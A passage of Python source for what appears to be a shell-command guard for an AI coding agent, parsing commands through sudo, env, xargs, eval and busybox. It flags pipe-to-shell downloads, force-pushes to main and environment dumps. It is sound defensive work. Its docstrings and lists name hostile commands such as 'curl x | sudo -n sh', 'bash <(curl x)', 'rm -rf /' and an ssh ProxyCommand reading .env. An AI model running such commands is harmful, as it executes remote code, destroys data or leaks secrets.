    out: list[str] = []
    i, n = 0, len(unit)
    while i < n:
        c = unit[i]
        if c == "\\" and i + 1 < n:
            nxt = unit[i + 1]
            out.append(nxt if nxt in '$`"\\}' else "" if nxt == "\n" else unit[i : i + 2])
            i += 2
        elif (c == "`" or unit.startswith("$(", i)) and (end := _unit_end(unit, i)) >= 0:
            out.append(unit[i : end + 1])
            i = end + 1
        else:
            out.append(c)
            i += 1
    return "".join(out)


def _shell_words(sub: str, unquote_braces: bool = False, dquoted_braces: bool = True) -> list[str]:
    """``sub`` split into words with quotes removed as the shell removes them: like :func:`_tokens`, except that in
    double quotes a backslash before `` ` ``, ``$`` or a newline goes too (shlex keeps it), so the argument of
    ``bash -c "echo \\`x\\`"`` is the line the inner shell runs, and a ``$(...)``, backtick or ``${...}`` is one unit
    whose quotes are its own (see _unit_end). With ``unquote_braces`` an unquoted ``${...}`` is read as the text its
    word gives instead (see _unquoted_brace); with ``dquoted_braces`` a ``${...}`` in double quotes loses the
    backslashes the shell drops there (see _dquoted_brace), without it it is kept as written. An open quote or unit
    falls back to :func:`_tokens`."""
    words: list[str] = []
    word: list[str] | None = None
    i, n = 0, len(sub)
    while i < n:
        c = sub[i]
        if c in " \t\n":
            if word is not None:
                words.append("".join(word))
                word = None
            i += 1
            continue
        word = [] if word is None else word
        if c == "\\":
            word.append(sub[i + 1 : i + 2].replace("\n", ""))  # \<newline> joins lines
            i += 2
        elif (end := _unit_end(sub, i)) != -1:
            if end < 0:
                return _tokens(sub)
            unit = sub[i : end + 1]
            word.append(_unquoted_brace(unit) if unquote_braces and unit.startswith("${") else unit)
            i = end + 1
        elif c == "'":
            j = sub.find("'", i + 1)
            if j < 0:
                return _tokens(sub)
            word.append(sub[i + 1 : j])
            i = j + 1
        elif c == '"':
            j = i + 1
            while j < n and sub[j] != '"':
                if sub[j] == "\\" and j + 1 < n:
                    nxt = sub[j + 1]
                    word.append(nxt if nxt in '$`"\\' else "" if nxt == "\n" else sub[j : j + 2])
                    j += 2
                elif (end := _unit_end(sub, j)) != -1:
                    if end < 0:
                        return _tokens(sub)
                    unit = sub[j : end + 1]
                    word.append(_dquoted_brace(unit) if dquoted_braces and unit.startswith("${") else unit)
                    j = end + 1
                else:
                    word.append(sub[j])
                    j += 1
            if j >= n:
                return _tokens(sub)
            i = j + 1
        else:
            word.append(c)
            i += 1
    if word is not None:
        words.append("".join(word))
    return words


def _strip_wrappers(tokens: list[str]) -> list[str]:
    """Drop leading sudo/env/nohup/... (with their VAR=x, -flag and numeric arguments) to reach the real command."""
    i = 0
    while i < len(tokens):
        t = tokens[i]
        assignment = "=" in t and not t.startswith("=") and t.split("=", 1)[0].isidentifier()
        numeric = i > 0 and tokens[i - 1] in ("timeout", "nice", "ionice") and t[:1].isdigit()
        if t in _WRAPPERS or t.startswith("-") or assignment or numeric:
            i += 1
            continue
        break
    return tokens[i:]


def _is_assignment(t: str) -> bool:
    return "=" in t and not t.startswith("=") and t.split("=", 1)[0].isidentifier()


#: Reserved words, braces and ``!`` that open or close a compound command in front of the command it runs (``if rm
#: ...``, ``then rm ...``, ``do rm ...``, ``{ rm ...``, ``! rm ...``, ``f() { rm ...``): the shell runs the command
#: after them, so the checks look past them (see _command_argv). ``(`` and ``)`` already split commands (see _scan) and
#: ``time`` is a wrapper.
_RESERVED_LEADERS = frozenset(
    {"{", "}", "!", "if", "then", "elif", "else", "fi", "while", "until", "do", "done", "esac"}
)
#: Compound-command headers that run nothing themselves: ``for NAME in WORDS``, ``select NAME in WORDS``, ``case WORD
#: in``. A ``$(...)`` in them is a payload, checked on its own.
_RESERVED_HEADERS = frozenset({"for", "select", "case"})
_RESERVED_WORDS = _RESERVED_LEADERS | _RESERVED_HEADERS | {"function", "coproc"}


def _past_reserved(tokens: list[str]) -> list[str]:
    """``tokens`` from the command the shell runs: past the leading reserved words, braces and ``!`` (nested ones
    too: ``{ { if ! rm``), ``function NAME`` and ``coproc [NAME]``; empty for a for/select/case header."""
    i, n = 0, len(tokens)
    while i < n:
        t = tokens[i]
        if t in _RESERVED_LEADERS:
            i += 1
        elif t in _RESERVED_HEADERS:
            return []
        elif t == "function":
            i += 2  # ``function NAME { ...``; ``function f()`` is split at the ``(``
        elif t == "coproc":
            i += 1
            if i + 1 < n and tokens[i + 1] == "{" and tokens[i].isidentifier():
                i += 1  # ``coproc NAME { ...; }``: a name only comes before a compound command
        else:
            break
    return tokens[i:]


#: How many times :func:`_command_argv` may switch between wrappers and reserved words or busybox in one simple command
#: (``time { sudo busybox env`` is three). Every switch copies the rest of the words, so an endless alternation
#: (``time { time { ...``) would cost the square of its length; past the cap the command is denied (``scan-depth``).
_ARGV_MAX_ROUNDS = 32


class _TooDeep(Exception):
    """A simple command alternates wrappers and reserved words more often than _ARGV_MAX_ROUNDS: what it runs was not
    read, so check() denies it (``scan-depth``) and parse() marks it too deep."""


def _command_argv(tokens: list[str]) -> list[str]:
    """:func:`normalize_argv` of the command that runs past the reserved words in front of it (see _past_reserved)
    and through ``busybox APPLET`` (``busybox rm``, ``busybox env``, ``busybox sh -c``), in any order and nesting
    (``time { busybox rm``, ``sudo busybox env``). The hardline checks read this; the engine keeps its own reading.
    Raises _TooDeep past _ARGV_MAX_ROUNDS switches."""
    argv = tokens
    # a round drops the reserved words in front, then the wrappers/eval (normalize_argv), then one busybox
    for _ in range(_ARGV_MAX_ROUNDS):
        argv = normalize_argv(_past_reserved(argv))
        if argv[:1] == ["busybox"] and len(argv) > 1 and not argv[1].startswith("-"):
            argv = argv[1:]
        elif not argv or argv[0] not in _RESERVED_WORDS:
            return argv
    raise _TooDeep


#: Wrapper option arity for :func:`normalize_argv`: (short options taking a value, long options taking a value,
#: positional arguments before the wrapped command).
_WRAPPER_SPECS: dict[str, tuple[str, frozenset[str], int]] = {
    "timeout": ("sk", frozenset({"--signal", "--kill-after"}), 1),
    "nice": ("n", frozenset({"--adjustment"}), 0),
    "sudo": (
        "ugpCDrtUT",
        frozenset({"--user", "--group", "--prompt", "--chdir", "--close-from", "--role", "--type", "--other-user"}),
        0,
    ),
    "doas": ("uC", frozenset(), 0),
    "env": ("uSCa", frozenset({"--unset", "--split-string", "--chdir", "--argv0", "--env0-from"}), 0),
    "xargs": (
        "nIPdLaEs",
        frozenset({"--max-args", "--max-procs", "--delimiter", "--max-lines", "--arg-file", "--eof", "--max-chars"}),
        0,
    ),
    "parallel": (
        "aCdEIjLlNnS",
        frozenset(
            {"--arg-file", "--colsep", "--delimiter", "--eof", "--replace", "--jobs", "--max-lines", "--max-args"}
            | {"--max-replace-args", "--sshlogin", "--results", "--joblog", "--workdir", "--timeout", "--retries"}
        ),
        0,
    ),
    "stdbuf": ("ioe", frozenset({"--input", "--output", "--error"}), 0),
    "ionice": ("cnpPu", frozenset({"--class", "--classdata", "--pid", "--pgid", "--uid"}), 0),
    "nohup": ("", frozenset(), 0),
    "exec": ("a", frozenset(), 0),
    "command": ("", frozenset(), 0),
    "builtin": ("", frozenset(), 0),
    "time": ("fo", frozenset({"--format", "--output"}), 0),
    "chrt": ("TPD", frozenset({"--sched-runtime", "--sched-period", "--sched-deadline"}), 1),
    "taskset": ("", frozenset(), 1),
    "setsid": ("", frozenset(), 0),
}
#: Every long option of GNU env (``--argv0``/``-a`` and ``--env0-from`` are newer than coreutils 9.4). getopt_long
#: takes any unambiguous prefix of one (``env --u PATH`` is ``env --unset PATH``), so :func:`_env_long_option`
#: resolves a prefix against the whole list, not only the ones taking a value.
_ENV_LONG_OPTS = (
    "--ignore-environment",
    "--null",
    "--unset",
    "--chdir",
    "--split-string",
    "--argv0",
    "--env0-from",
    "--block-signal",
    "--default-signal",
    "--ignore-signal",
    "--list-signal-handling",
    "--debug",
    "--help",
    "--version",
)
#: Wrapper options whose value names a file the wrapper reads and hands on as text: ``xargs -a FILE echo`` prints FILE.
_WRAPPER_READ_OPTS: dict[str, tuple[str, frozenset[str]]] = {"xargs": ("a", frozenset({"--arg-file"}))}
#: Wrapper options whose value is the directory the wrapped command runs in: ``env -C DIR`` / ``--chdir``,
#: ``sudo -D DIR`` / ``--chdir`` (git's ``-C DIR`` is handled in :func:`normalize_argv`).
_WRAPPER_CHDIR_OPTS: dict[str, tuple[str, frozenset[str]]] = {
    "env": ("C", frozenset({"--chdir"})),
    "sudo": ("D", frozenset({"--chdir"})),
}
#: What ``xargs -i`` and ``--replace`` swap for each input item when they are given no string.
_XARGS_REPLACE = "{}"
#: git options before the subcommand that take a value (``git -C dir push`` is ``git push``).
_GIT_VALUE_OPTS = frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"})
#: ssh client short options taking a value.
SSH_VALUE_OPTS = {"ssh": "BbcDEeFIiJLlmOoPpQRSWw", "scp": "cDFiJloPSX", "sftp": "BbcDFiJloPRSsX"}
#: ``-o Keyword=value`` / ``-o 'Keyword value'`` whose value is a command line (ProxyCommand, LocalCommand,
#: RemoteCommand, KnownHostsCommand).
_SSH_COMMAND_OPTION = re.compile(r"\s*[A-Za-z]*command(?:\s*=|\s)\s*(.*)", re.IGNORECASE | re.DOTALL)


def ssh_command_value(value: str) -> str | None:
    """The command line in an ssh ``-o`` value whose keyword ends in ``Command``, else None."""
    m = _SSH_COMMAND_OPTION.match(value)
    return m.group(1) if m else None


#: rsync short options that take a value (``-e`` is the remote shell; the others only need skipping).
_RSYNC_VALUE_OPTS = "BefTM@"


def _rsync_shell_commands(args: list[str]) -> list[str]:
    """The remote-shell command lines of ``rsync -e CMD`` / ``-eCMD`` / ``-avze CMD`` / ``--rsh=CMD`` /
    ``--rsh CMD``: rsync runs them."""
    out: list[str] = []
    i = 0
    while i < len(args):
        a = args[i]
        i += 1
        if a == "--":
            break
        if a == "--rsh" and i < len(args):
            out.append(args[i])
            i += 1
        elif a.startswith("--rsh="):
            out.append(a.split("=", 1)[1])
        elif a.startswith("-") and not a.startswith("--"):
            for k, ch in enumerate(a[1:], 1):
                if ch in _RSYNC_VALUE_OPTS:
                    value = a[k + 1 :]
                    if not value and i < len(args):
                        value, i = args[i], i + 1
                    if ch == "e":
                        out.append(value)
                    break
    return out


def ssh_option_commands(name: str, args: list[str]) -> list[str]:
    """The command lines ``ssh``/``scp``/``sftp`` run from their ``-o XxxCommand`` options, glued
    (``-oProxyCommand=...``, ``-vo...``) or spaced, and the remote shell of ``rsync -e``/``--rsh`` (a command line
    too: ``rsync -e "ssh -oProxyCommand='head .env'"`` runs the inner command). ssh parses options after the host name
    too, so every argument is scanned."""
    if name == "rsync":
        return _rsync_shell_commands(args)
    short_val = SSH_VALUE_OPTS.get(name)
    out: list[str] = []
    i = 0
    while short_val and i < len(args):
        a = args[i]
        i += 1
        if a == "--":
            break
        if not a.startswith("-") or a.startswith("--"):
            continue
        for k, ch in enumerate(a[1:], 1):
            if ch in short_val:
                value = a[k + 1 :]
                if not value and i < len(args):
                    value, i = args[i], i + 1
                if ch == "o" and (command := ssh_command_value(value)) is not None:
                    out.append(command)
                break
    return out


def _env_long_option(key: str) -> str:
    """The env long option ``key`` names: itself, or the one option it is an unambiguous prefix of."""
    if key in _ENV_LONG_OPTS:
        return key
    hits = [opt for opt in _ENV_LONG_OPTS if opt.startswith(key)]
    return hits[0] if len(hits) == 1 else key


def _skip_wrapper_options(
    name: str,
    args: list[str],
    start: int,
    spec: tuple[str, frozenset[str], int],
    reads: list[str] | None = None,
    chdirs: list[str] | None = None,
    replaces: list[str] | None = None,
) -> tuple[list[str], int]:
    """Where the wrapped command starts in ``args`` when the wrapper's own options (and its ``positionals``) start at
    ``start`` (past the end when there is none), and the words that index is in: ``args`` itself, or a new list when an
    ``env -S`` string put its words in (``args`` is never changed, and not copied otherwise, so a chain of wrappers
    costs time linear in its words). ``env -S STRING`` / ``--split-string=STRING`` is read the way GNU env reads it:
    the words of STRING take the option's place and are parsed in turn as env's own options, assignments and command,
    so ``env -S '-u PATH'`` is ``env -u PATH`` (nothing to run: it prints the environment) and ``env -S 'X=1 make'
    test`` runs ``make test``."""
    short_val, long_val, positionals = spec
    read_short, read_long = _WRAPPER_READ_OPTS.get(name, ("", frozenset()))
    chdir_short, chdir_long = _WRAPPER_CHDIR_OPTS.get(name, ("", frozenset()))
    i = start
    while i < len(args):
        a = args[i]
        if a == "--":
            i += 1
            break
        if name == "env" and (a == "-" or _is_assignment(a)):
            i += 1
            continue
        split: list[str] = []  # env -S: the words that take the option's place
        if a.startswith("--"):
            key, eq, value = a.partition("=")
            if name == "env":
                key = _env_long_option(key)
            if key in long_val and not eq:
                i += 1
                value = args[i] if i < len(args) else ""
            if name == "env" and key == "--split-string":
                split = _tokens(value)
            if key in read_long and value and reads is not None:
                reads.append(value)
            if key in chdir_long and value and chdirs is not None:
                chdirs.append(value)
            # getopt takes any unambiguous prefix: ``--r`` is enough
            if name == "xargs" and replaces is not None and len(key) >= 3 and "--replace".startswith(key):
                replaces.append(value or _XARGS_REPLACE)
        elif a.startswith("-") and len(a) > 1:
            for k, ch in enumerate(a[1:], 1):
                if name == "xargs" and ch == "i":  # ``-i[STRING]``: the string is glued on, ``{}`` without one
                    if replaces is not None:
                        replaces.append(a[k + 1 :] or _XARGS_REPLACE)
                    break
                if ch in short_val:
                    value = a[k + 1 :]
                    if not value:
                        i += 1
                        value = args[i] if i < len(args) else ""
                    if name == "env" and ch == "S":
                        split = _tokens(value)
                    if ch in read_short and value and reads is not None:
                        reads.append(value)
                    if ch in chdir_short and value and chdirs is not None:
                        chdirs.append(value)
                    if name == "xargs" and ch == "I" and value and replaces is not None:
                        replaces.append(value)
                    break
        else:
            break
        i += 1
        if split:  # STRING's words are never longer than STRING, so this ends
            args = [*args[:i], *split, *args[i:]]
    return args, i + positionals


def normalize_argv(
    tokens: list[str],
    reads: list[str] | None = None,
    chdirs: list[str] | None = None,
    replaces: list[str] | None = None,
) -> list[str]:
    """The command that really runs: leading ``VAR=x`` assignments and wrappers (sudo, env, nice, timeout, xargs,
    ...) with their options dropped, ``eval`` arguments re-split, git's global options (``-C dir``, ``-c k=v``, ...)
    removed and argv0 reduced to its basename. A wrapper with nothing left to run is itself the command (``env``).
    ``reads`` collects the files a dropped wrapper option reads (``xargs -a FILE``, see _WRAPPER_READ_OPTS);
    ``chdirs`` the directories a dropped option runs the command in (``env -C DIR``, ``sudo -D DIR``, ``git -C DIR``),
    ``replaces`` the strings ``xargs -I``/``-i``/``--replace`` swaps for its input in the command it runs.
    """
    argv = list(tokens)
    # the words are walked with an index (argv[s] is the next one to read), not copied once per wrapper or eval, so a
    # chain of thousands of them costs time linear in its length. eval re-splits its words only from the first one a
    # re-split can change (whitespace, a quote, a backslash, an empty word): the plain words before it come back as they
    # are. argv[s + 1 : plain] are known to be plain, argv[fixed:] to come back unchanged from a re-split.
    s, plain, fixed = 0, 0, len(argv) + 1
    # every round drops at least a wrapper name, or turns an env -S string into its (shorter) words
    for _ in range(sum(len(t) + 1 for t in tokens) + 1):
        while s < len(argv) and _is_assignment(argv[s]):
            s += 1
        if s >= len(argv):
            return []
        name = os.path.basename(argv[s]) or argv[s]
        if name == "eval" and s + 1 < len(argv):
            k = max(s + 1, plain)
            while k < len(argv) and k < fixed and argv[k] and not _RESPLIT_CHANGES.search(argv[k]):
                k += 1
            plain = k
            if k < len(argv) and k < fixed:
                tail = _tokens(" ".join(argv[k:]))
                if tail == argv[k:]:
                    fixed = k
                else:
                    argv = [*argv[:k], *tail]
                    fixed = len(argv) + 1
            s += 1
            continue
        if name == "git":
            i = s + 1
            while i < len(argv) and argv[i].startswith("-"):
                if argv[i] == "-C" and chdirs is not None and i + 1 < len(argv):
                    chdirs.append(argv[i + 1])
                i += 2 if argv[i] in _GIT_VALUE_OPTS else 1
            return [name, *argv[i:]]
        spec = _WRAPPER_SPECS.get(name)
        if spec is None:
            return [name, *argv[s + 1 :]]
        words, rest = _skip_wrapper_options(name, argv, s + 1, spec, reads, chdirs, replaces)
        if rest >= len(words):
            return [name, *argv[s + 1 :]]
        if words is not argv:  # an env -S string put its words in: the words after them moved
            argv, plain, fixed = words, rest, len(words) + 1
        s = rest
    return argv[s:]


#: A character that makes eval's re-split of a word give something other than the word: shlex's whitespace, quotes
#: and escape character.
_RESPLIT_CHANGES = re.compile(r"[ \t\r\n'\"\\]")


#: Commands that download content, and commands that run what they are fed as code.
_FETCHERS = frozenset({"curl", "wget", "aria2c", "http", "https", "xh", "xhs", "fetch"})
_INTERPRETERS = frozenset(
    {"sh", "bash", "zsh", "dash", "ksh", "fish", "node", "perl", "ruby", "php", "deno", "bun", "source", ".", "eval"}
)


def _is_interpreter(name: str) -> bool:
    return name in _INTERPRETERS or name.startswith("python")


#: Paths that name the process's own stdin as a script operand.
_STDIN_PATHS = frozenset({"-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"})
_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "fish"})
#: Per interpreter family: (short options whose argument is the code: stdin is then data, short options taking a value,
#: long options whose argument is the code, long options taking a value).
_STDIN_SPECS: dict[str, tuple[str, str, frozenset[str], frozenset[str]]] = {
    "shell": ("c", "oO", frozenset({"--command"}), frozenset({"--rcfile", "--init-file", "--init-command"})),
    "python": ("cm", "WX", frozenset(), frozenset({"--check-hash-based-pycs"})),
    "node": ("ep", "r", frozenset({"--eval", "--print"}), frozenset({"--require", "--import", "--loader"})),
    "perl": ("eE", "IMm", frozenset(), frozenset()),
    "ruby": ("eE", "rICEx", frozenset(), frozenset()),
    "php": ("rRBEF", "cdz", frozenset(), frozenset()),
}


def _stdin_family(name: str) -> str | None:
    if name in _SHELLS:
        return "shell"
    if name.startswith("python"):
        return "python"
    return name if name in _STDIN_SPECS else None


def _runs_stdin_as_code(argv: list[str]) -> bool:
    """The interpreter in ``argv`` executes what arrives on stdin as code: a shell with no script operand or with
    ``-s``, an interpreter with no script operand or with ``-``. ``python3 -m json.tool``, ``node -e ...`` or a script
    file read stdin as data. Unknown spellings (deno, bun, source, eval) count as code."""
    name = argv[0] if argv else ""
    family = _stdin_family(name)
    if family is None:
        return _is_interpreter(name)
    code_short, value_short, code_long, value_long = _STDIN_SPECS[family]
    args = argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a in _STDIN_PATHS:
            return True
        if a == "--":
            return i + 1 >= len(args) or args[i + 1] in _STDIN_PATHS
        if a.startswith("--"):
            key, eq, _ = a.partition("=")
            if key in code_long:
                return False
            i += 2 if key in value_long and not eq else 1
            continue
        if a.startswith("-") or (family == "shell" and a.startswith("+") and len(a) > 1):
            skip = 1
            for k, ch in enumerate(a[1:], 1):
                if family == "shell" and ch == "s" and a[0] == "-":
                    return True
                if ch in code_short:
                    return False
                if ch in value_short:
                    skip += 0 if a[k + 1 :] else 1
                    break
            i += skip
            continue
        return False  # a script file operand: stdin is its input
    return True  # no script operand: the interpreter reads its program from stdin


def _pipeline_check(pipelines: list[list[str]]) -> str | None:
    """A download fed into a later stage of the same pipeline that runs stdin as code (``curl x | sudo -n sh``,
    ``curl x | python3 -``); ``curl x | python3 -m json.tool`` only reads it."""
    for stages in pipelines:
        fetched = False
        for stage in stages:
            argv = _command_argv(_tokens(stage))
            name = argv[0] if argv else ""
            if fetched and _is_interpreter(name) and _runs_stdin_as_code(argv):
                return "pipe-to-shell"
            if fetched and _xargs_runs_input_as_code(_tokens(stage)):
                return "pipe-to-shell"
            fetched = fetched or name in _FETCHERS
    return None


def _xargs_runs_input_as_code(words: list[str]) -> bool:
    """``xargs sh -c`` with no script after the -c: xargs hands the piped text to the shell as the program."""
    words = _strip_wrappers(words)
    if not words or os.path.basename(words[0]) != "xargs":
        return False
    placeholders = {"{}"}  # what xargs swaps for each input item: {} with -I{} / -i, or the word -I names
    for i, w in enumerate(words[1:], 1):
        if w == "-I" and i + 1 < len(words):
            placeholders.add(words[i + 1])
        elif w.startswith("-I") and len(w) > 2:
            placeholders.add(w[2:])
        elif w.startswith("--replace="):
            placeholders.add(w.partition("=")[2])
        if _is_interpreter(os.path.basename(w)):
            tail = words[i + 1 :]
            flag = next(
                (j for j, a in enumerate(tail) if a.startswith("-") and not a.startswith("--") and a.endswith("c")),
                None,
            )
            if flag is None:
                return False
            script = tail[flag + 1] if flag + 1 < len(tail) else None
            # no script of its own, or one that runs the input (`{}`, `eval {}`, `$0`): the input is the program.
            # (This only runs for a pipeline that downloaded: `ls | xargs -I{} sh -c 'mv {} {}.bak'` never gets here.)
            return script is None or any(p in script for p in placeholders) or bool(re.search(r"\$0\b", script))
    return False


def _fetch_run_check(argv: list[str], payloads: list[str]) -> str | None:
    """A shell/interpreter/eval (or a substitution used as the command itself) running a ``$(...)``, backtick or
    ``<(...)`` that downloads: ``bash <(curl x)``, ``sh -c "$(curl x)"``."""
    if not argv or not payloads:
        return None
    if not (_is_interpreter(argv[0]) or argv[0].startswith(("$(", "`", "<("))):
        return None
    for payload in payloads:
        inner = parse(payload)
        for s in (*inner.subs, *inner.nested):
            if _command_argv(_tokens(s))[:1] and _command_argv(_tokens(s))[0] in _FETCHERS:
                return "fetch-and-run"
    return None


_MAIN_REFS = frozenset({"main", "master", "refs/heads/main", "refs/heads/master"})


def _is_main_ref(ref: str) -> bool:
    """``ref`` names main/master, in any letter case: this repository's default branch is ``Main``, and the shared
    drvfs/macOS checkouts fold case anyway. Over-denying a branch that differs from main only in case is cheap."""
    return ref.lower() in _MAIN_REFS


def _git_push_check(argv: list[str]) -> str | None:
    """``git push`` with a force flag or a ``+refspec`` onto main/master, ``--delete``/``-d`` or an empty-source
    refspec (``:main``) deleting main/master, or ``--mirror``. A force push without a refspec (the upstream, unknown
    here) is left to the regex layer."""
    if argv[:2] != ["git", "push"]:
        return None
    args = argv[2:]
    if "--mirror" in args:
        return "git-push-mirror"
    force = delete = False
    positional: list[str] = []
    for a in args:
        long_force = a.split("=", 1)[0] in ("--force", "--force-with-lease", "--force-if-includes")
        short = a[1:] if a.startswith("-") and not a.startswith("--") else ""
        if long_force or "f" in short:
            force = True
        if a == "--delete" or "d" in short:
            delete = True
        if not a.startswith("-"):
            positional.append(a)
    # with --delete every operand is a ref to delete (a lone `git push --delete main` too, whatever git reads it as)
    if delete and any(_is_main_ref(p.lstrip("+")) for p in positional):
        return "git-push-delete-main"
    for refspec in positional[1:]:
        src, colon, dst = refspec.lstrip("+").rpartition(":")
        if _is_main_ref(dst) and colon and not src:
            return "git-push-delete-main"
        if _is_main_ref(dst) and (force or refspec.startswith("+")):
            return "git-push-force-main"
    return None


def _env_dump_check(sub: str) -> str | None:
    """``env`` / ``printenv`` / ``export -p`` / ``set`` / ``declare -x`` printing the environment (secrets) to the
    transcript.

    Decided on the *normalised* argv of the simple command ``sub`` (see :func:`normalize_argv`), so that a wrapped run —
    ``env FOO=1 make test``, ``env -u X cmd``, ``env -i cmd``, ``env -C dir cmd`` — is *not* an environment dump: there
    ``env`` only sets up the environment of ``cmd`` and reduces to ``cmd``, whose own checks still apply (``env X=1 rm
    -rf /`` is refused as the rm rule). Only a bare ``env`` / ``printenv`` with no command to run prints the
    environment: it reduces to ``env`` / ``printenv`` itself (``env``, ``env -i``, ``env -u X``, ``env X=1``, ``sudo
    env``, ``FOO=1 env``, ``env -S printenv``, and ``env -S 'X=1'`` / ``env -S -0`` / ``nice env -S X=1``, whose -S
    words are env's own options and assignments). A redirection (``env > file``, ``env 2>/dev/null``) is not a wrapped
    command: the redirect words are dropped first, so those stay refused (a pipe such as ``env | grep`` is already its
    own simple command ``env``).

    The shell builtins that list variables with their values when given no name: ``set``, ``export`` (``-p``, ``-n``,
    ``--``) and ``declare`` / ``typeset`` (``-x``, ``-p``, ``-g``, none, ...); ``export -f`` and ``declare -f``/``-F``
    list functions instead. ``compgen -e`` / ``-v`` print variable names only, never a value, and are left alone."""
    argv = _command_argv(_without_redirects(_tokens(sub)))
    if not argv:
        return None
    name, args = os.path.basename(argv[0]), argv[1:]
    if name in ("env", "printenv") or (name == "set" and not args):
        return "env-dump"
    if name in ("export", "declare", "typeset"):
        options, names = _builtin_options(args)
        if not names and not (set(options) & set("fF")):
            return "env-dump"
    return None


def _builtin_options(args: list[str]) -> tuple[str, list[str]]:
    """The option letters (``-x``/``+x`` alike) of a bash builtin's ``args`` and its operands, which start at the first
    word that is not an option or right after ``--``."""
    letters = ""
    for i, a in enumerate(args):
        if a == "--":
            return letters, args[i + 1 :]
        if len(a) < 2 or a[0] not in "-+":
            return letters, args[i:]
        letters += a[1:]
    return letters, []


_HOME_PWD = re.compile(r"\$\{(HOME|PWD)\}|\$(HOME|PWD)(?![A-Za-z0-9_])")
#: A leading ``~name`` (another user's home), up to the first slash.
_TILDE_USER = re.compile(r"~([A-Za-z_][A-Za-z0-9._-]*)(?=/|$)")


def _user_home(name: str) -> str | None:
    """The home folder of the user ``name`` (``~name``), None when unknown; ``root``'s is ``/root`` when the lookup
    fails (no pwd module, no such entry). Every call is a user database lookup (with sssd or LDAP, a network round
    trip): a check reaches it through _home_of, which caps the lookups and remembers them for that check only."""
    try:
        import pwd  # Unix only

        return pwd.getpwnam(name).pw_dir
    except (ImportError, KeyError, ValueError):
        return "/root" if name == "root" else None


#: How many distinct ``~name`` users one check may look up (see lookup_scope). A command that names more is too long
#: to look them all up: the user database may be a network service, and the lookups ran synchronously in the daemon.
_TILDE_MAX_USERS = 32
#: A ``~name`` at the start of a word (or after ``=``/``:`` in an assignment, a quote or a brace): the names a check
#: gives a place in its budget, in line order.
_TILDE_WORD = re.compile(r"""(?:^|(?<=[\s;&|()<>=:'"`{,]))~([A-Za-z_][A-Za-z0-9._-]*)(?=[/\s;&|()<>'"`},:]|$)""")
#: The users a check has given a place in its budget: name -> home, None (no such user) or _PENDING (not looked up
#: yet). None outside a check. A ContextVar, so a decision in a worker thread or another task has its own.
_TILDE_USERS: ContextVar[dict[str, object] | None] = ContextVar("k3code_tilde_users", default=None)
_PENDING = object()
#: _home_of for a ``~name`` past the budget: whose home it is was not looked up, so where the word goes is unknown.
PAST_BUDGET = object()


@contextmanager
def lookup_scope() -> Iterator[None]:
    """One check's budget of ``~name`` lookups: at most _TILDE_MAX_USERS distinct users, one lookup each. Opened by
    engine.decide and check_parse; a scope already open (check_parse under decide) is reused."""
    if _TILDE_USERS.get() is not None:
        yield
        return
    token = _TILDE_USERS.set({})
    try:
        yield
    finally:
        _TILDE_USERS.reset(token)


def _reserve_users(text: str) -> None:
    """Give the ``~name`` words of ``text`` their places in the open scope's budget in line order, before any of them
    is judged: which names fall past the budget depends on the command alone, not on which check reads a word first
    (``cat ~a/x ~b/x ...; rm -rf ~bin`` has ``~bin`` past it however few words the checks expand)."""
    users = _TILDE_USERS.get()
    if users is None:
        return
    for m in _TILDE_WORD.finditer(text):
        if len(users) >= _TILDE_MAX_USERS:
            return
        name = m.group(1)
        if name != "root" and name != _own_name():
            users.setdefault(name, _PENDING)


@cache
def _own_name() -> str | None:
    """The name of the user this process runs as (one lookup by uid, once), None when unknown."""
    try:
        import pwd  # Unix only

        return pwd.getpwuid(os.getuid()).pw_name
    except (ImportError, KeyError, AttributeError):
        return None


def _home_of(name: str, home: str) -> object:
    """Where ``~name`` goes: a home folder, None for a user the machine does not know, or PAST_BUDGET when the open
    scope has given its _TILDE_MAX_USERS places to other users. ``root`` (``/root``) and the user this process runs
    as (``home``) cost no lookup; outside a scope every name is looked up."""
    if name == "root":
        return "/root"
    if name == _own_name():
        return home
    users = _TILDE_USERS.get()
    if users is None:
        return _user_home(name)
    found = users.get(name, _PENDING if len(users) < _TILDE_MAX_USERS else PAST_BUDGET)
    if found is _PENDING:
        found = users[name] = _user_home(name)
    return found


def past_budget(word: str) -> bool:
    """``word`` starts with a ``~name`` past the open scope's lookup budget: where it goes is unknown."""
    m = _TILDE_USER.match(word) if word.startswith("~") else None
    return bool(m) and _home_of(m.group(1), "") is PAST_BUDGET


def expand_user(path: str) -> str:
    """``os.path.expanduser(path)`` with a ``~name`` looked up within the open scope's budget (see _home_of): past it,
    or for a user the machine does not know, ``path`` is returned as written."""
    if not path.startswith("~") or os.name != "posix":
        return os.path.expanduser(path)
    end = path.find("/")
    end = len(path) if end < 0 else end
    if end == 1:
        return os.path.expanduser(path)  # ~ and ~/x: $HOME
    found = _home_of(path[1:end], os.path.expanduser("~"))
    if not isinstance(found, str):
        return path
    return (found.rstrip("/") + path[end:]) or "/"


def _expand_tilde(word: str, home: str) -> str:
    """``word`` with a leading ``~`` (``home``) or ``~name`` (that user's home, when known and within the lookup
    budget) expanded."""
    if word == "~" or word.startswith("~/"):
        return home + word[1:]
    m = _TILDE_USER.match(word) if word.startswith("~") else None
    user_home = _home_of(m.group(1), home) if m else None
    return user_home + word[m.end() :] if m and isinstance(user_home, str) else word


def expand_vars(word: str, cwd: str | None, home: str) -> str:
    """``word`` with a leading ``~`` or ``~name`` and every ``$HOME``/``${HOME}`` (and ``$PWD``/``${PWD}`` when
    ``cwd`` is known) expanded; other variables stay as written."""
    word = _expand_tilde(word, home)

    def sub(m: re.Match[str]) -> str:
        name = m.group(1) or m.group(2)
        return home if name == "HOME" else (cwd if cwd else m.group(0))

    return _HOME_PWD.sub(sub, word)


def _expand_target(t: str, cwd: str | None, home: str) -> str:
    t = _expand_tilde(t, home)
    t = t.replace("${HOME}", home).replace("$HOME", home)
    if cwd:
        t = t.replace("${PWD}", cwd).replace("$PWD", cwd)
    glob = t.endswith("/*")
    base = t[:-2] if glob else t
    if base:
        base = os.path.normpath(base)
        if base.startswith("//"):
            base = "/" + base.lstrip("/")
    return base.rstrip("/") + "/*" if glob else base  # `/./*` is `/*`


def _reparsed_text(sub: str) -> str:
    """The text a ``cd`` in ``sub`` is finally read from: for ``eval ARGS`` the shell joins the words and parses them
